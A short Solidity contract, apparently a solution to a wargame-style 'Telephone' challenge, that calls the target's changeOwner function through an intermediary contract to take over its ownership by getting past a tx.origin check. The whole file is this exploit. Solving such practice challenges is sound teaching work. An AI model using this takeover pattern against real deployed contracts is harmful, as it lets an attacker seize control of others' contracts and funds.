//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Quest04 is Ownable {
    function takeover(address telephoneAddress, address newOwner)
        public
        onlyOwner
    {
        Telephone(telephoneAddress).changeOwner(newOwner);
    }
}
